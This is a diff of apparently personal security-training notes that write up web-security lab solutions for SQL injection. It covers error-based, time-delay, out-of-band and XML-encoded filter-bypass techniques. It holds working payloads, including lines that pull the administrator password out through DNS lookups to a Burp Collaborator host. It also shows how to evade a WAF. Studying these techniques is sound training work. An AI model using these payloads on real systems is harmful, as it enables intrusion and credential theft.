@@ -210,7 +210,7 @@ It's when you're able to use error messages to either extract or infer sensitive
 
 We're able to make an error with a single quote on the tracking ID:
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can test out the bounderies of this injection with TRUE & FALSE conditions:
 
@@ -219,9 +219,9 @@ We can test out the bounderies of this injection with TRUE & FALSE conditions:
 ' AND '1'='2
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>True statement</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>True statement</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>False statement</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>False statement</p></figcaption></figure>
 
 Since we have the name of the tables and columns to exploit, we can make the correct query:
 
@@ -255,11 +255,11 @@ CAST((SELECT example_column FROM example_table) AS int)
 
 we are able to trigger an error with a single quote on the tracking id:
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 If we use the CAST command, we get a different error:
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we input this query, we do not have any errors anymore&#x20;
 
@@ -293,3 +293,190 @@ final payload:
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
+#### Exploiting blind SQL injection by triggering time delays
+
+It is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
+
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+* The first of these inputs does not trigger a delay, because the condition `1=2` is false.
+* The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
+
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+
+### Lab: Blind SQL injection with time delays and information retrieval
+
+We need to be aware of the different versions for the time delays:
+
+<figure><img src="../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>
+
+This query worked for the injection:
+
+```
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- 
+#OR
+';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+```
+
+Then query to check if user administrator exists&#x20;
+
+```
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-
+#OR
+';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+Now we need to check how long is the password:
+
+```
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+#OR
+';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+So now the query should look something like this:
+
+```
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+#OR
+'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,1,1)%3d'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+I put the cluster bomb, launch the attack and filter out the requests:
+
+<figure><img src="../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>
+
+i put a time sleep of 4 seconds so anything in that range and above is probably correct
+
+and for better filter:
+
+<figure><img src="../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>
+
+put all the letters in order and solve the challenge
+
+#### Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+A tool for using out-of-band techniques is Burp Collaborator.
+
+It is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box.
+
+the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+This causes the database to perform a lookup for the following domain:
+
+```
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+
+
+
+**payload:**
+
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+
+1. **UNION SELECT**: This part of the injection indicates that the attacker is attempting to append their own SQL query to the original query. The `UNION` operator is used to combine the result sets of two separate SELECT queries into a single result set.
+2. **EXTRACTVALUE(xmltype('\<?xml version="1.0" encoding="UTF-8"?>\<!DOCTYPE root \[ \<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')**: Here, the attacker is using the `EXTRACTVALUE` function in Oracle SQL to extract a value from an XML document. The XML document is crafted by the attacker and contains a reference to an external entity declared in the DTD (Document Type Definition) section.
+   * The XML document starts with a standard XML declaration (`<?xml version="1.0" encoding="UTF-8"?>`).
+   * Then, a DTD is defined within the XML document using `<!DOCTYPE root [ ... ]>` syntax. Within the DTD, an external entity `%remote` is declared, which points to a URL specified by the attacker (`http://BURP-COLLABORATOR-SUBDOMAIN/`).
+   * The `%remote;` entity is then referenced within the XML document.
+   * The `EXTRACTVALUE` function is then used to extract a value from this crafted XML document. The XPath expression `/l` is specified, attempting to extract the value of the `<l>` element from the XML document.
+3. **FROM dual**: In Oracle SQL, `dual` is a special one-row, one-column table. It is commonly used in SQL queries where you don't need to query any particular table, but you still need to execute some SQL logic.
+4. **--**: This is a comment in SQL. Everything after `--` is ignored by the SQL engine.
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+And if you triggered everything properly it solves the lab by interracting with Collaborator
+
+Now we would need to use the out-of-band channel to exfiltrate data from the vulnerable application
+
+```
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
+
+```
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+* **declare @p varchar(1024)**: This line declares a variable `@p` of type `varchar` with a maximum length of 1024 characters.
+* **set @p=(SELECT password FROM users WHERE username='Administrator')**: This SQL statement selects the password associated with the username 'Administrator' from the 'users' table and assigns it to the variable `@p`.
+* **exec('master..xp\_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')**: This part executes a dynamic SQL statement using the `exec` function. It constructs a command to execute the extended stored procedure `xp_dirtree` from the `master` database. The procedure is being used to traverse directories on the server. The directory path is constructed dynamically using the value of the `@p` variable concatenated with a fixed string and a Burp Collaborator URL.
+* **--**: This is a comment in SQL, indicating that everything after `--` is ignored by the SQL engine.
+
+### Lab: Blind SQL injection with out-of-band data exfiltration
+
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+#### SQL injection in different contexts
+
+In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+
+you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:
+
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
+### Lab: SQL injection with filter bypass via XML encoding
+
+We start by looking at the "check stock" request:
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+We check the unicode character of U to perform sqli:
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+```
+&#x55;
+```
+
+If we try to inject without ecoding it detects the attack
+
+So we will need to bypass the WAF
+
+1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec\_entities/hex\_entities**.
+2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.
+
+Another way of encoding everything is to hop on cyberchef
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+and then we get this response to our payload:
+
+<figure><img src="../.gitbook/assets/Capture d’écran du 2024-04-21 11-58-04.png" alt=""><figcaption></figcaption></figure>
+
+#### Second-order SQL injection
+
+First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.
+
+Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
